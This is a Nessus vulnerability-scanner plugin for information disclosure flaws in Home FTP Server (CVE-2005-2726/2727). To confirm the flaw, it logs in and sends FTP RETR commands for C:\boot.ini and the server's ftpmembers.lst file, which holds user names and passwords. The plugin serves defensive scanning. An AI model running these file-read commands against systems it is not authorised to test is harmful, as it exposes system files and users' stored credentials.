#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(19501);
  script_version("$Revision: 1.23 $");

  script_cve_id("CVE-2005-2726", "CVE-2005-2727");
  script_bugtraq_id(14653);
  script_osvdb_id(18968, 18969);

  script_name(english:"Home FTP Server Multiple Vulnerabilities");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is affected by various information disclosure
issues." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running Home Ftp Server, an FTP server
application for Windows. 

The installed version of Home Ftp Server by default lets authenticated
users retrieve configuration files (which contain, for example, the
names and passwords of users defined to the application) as well as
arbitrary files on the remote system." );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?a5e13b3f" );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2005/Aug/811" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:S/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/08/25");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/08/24");
 script_cvs_date("$Date: 2016/10/10 15:57:06 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_summary(english:"Checks for multiple vulnerabilities in Home Ftp Server");
  script_category(ACT_ATTACK);
  script_family(english:"FTP");
  script_copyright(english:"This script is Copyright (C) 2005-2016 Tenable Network Security, Inc.");
  script_dependencies("ftpserver_detect_type_nd_version.nasl", "ftp_overflow.nasl");
  script_require_keys("ftp/login", "ftp/password");
  script_require_ports("Services/ftp", 21);
  exit(0);
}


include('global_settings.inc');
include("misc_func.inc");
include("ftp_func.inc");


# nb: to exploit the vulnerability we need to log in.
user = get_kb_item_or_exit("ftp/login");
pass = get_kb_item_or_exit("ftp/password");


port = get_ftp_port(default: 21);

soc = open_sock_tcp(port);
if (!soc) exit(1, "Connection refused on port "+port+".");
if (!ftp_authenticate(socket:soc, user:user, pass:pass)) {
  ftp_close(socket: soc);
  exit(1, "cannot login on port "+port+" with supplied FTP credentials");
}


# Make sure it looks like Home Ftp Server.
#
# nb: don't trust the banner since that's completely configurable.
send(socket:soc, data:'SYST\r\n');
s = ftp_recv_line(socket:soc);
if ("UNIX Type: L8 Internet Component Suite" >!< s) {
  exit(0, "Service on port "+port+" doesn't look like Home Ftp Server.");
}


# Try to get boot.ini.
#
# nb: this may fail if another process is accessing the file.
port2 = ftp_pasv(socket:soc);
if (!port2) exit(1, "PASV failed on port "+port+".");
soc2 = open_sock_tcp(port2, transport:ENCAPS_IP);
if (!soc2) exit(1, "Connection refused to passive port "+port+".");

send(socket:soc, data:'RETR C:\\boot.ini\r\n');
s = ftp_recv_line(socket:soc);
if (egrep(string:s, pattern:"^(425|150) ")) {
  file = ftp_recv_data(socket:soc2);

  # There's a problem if it looks like a boot.ini.
  if ("[boot loader]" >< file) {
    report = strcat(
'Here are the contents of the file \'\\boot.ini\' that Nessus\n',
'was able to read from the remote host :\n\n',
 file );
    security_warning(port:port, extra:report);
    vuln = 1;
  }
}
close(soc2);


if (thorough_tests && isnull(vuln)) {
  # Try to retrieve the list of users.
  port2 = ftp_pasv(socket:soc);
  if (!port2) exit(1, "PASV failed on port "+port+".");
  soc2 = open_sock_tcp(port2, transport:ENCAPS_IP);
  if (!soc2) exit(1, "Connection refused to passive port "+port+".");

  send(socket:soc, data:'RETR ftpmembers.lst\r\n');
  s = ftp_recv_line(socket:soc);
  if (egrep(string:s, pattern:"^(425|150) ")) {
    file = ftp_recv_data(socket:soc2);

    # There's a problem if it looks like the member's list.
    if ("[ftpmembers]" >< file && "pass=" >< file) {
      report = strcat(
'Here are the contents of the file \'ftpmembers.lst\' that Nessus\n',
'was able to read from the remote host :\n\n',
  file );
      security_warning(port:port, extra:report);
    }
  }
  close(soc2);
}

# Close the connections.
ftp_close(socket:soc);
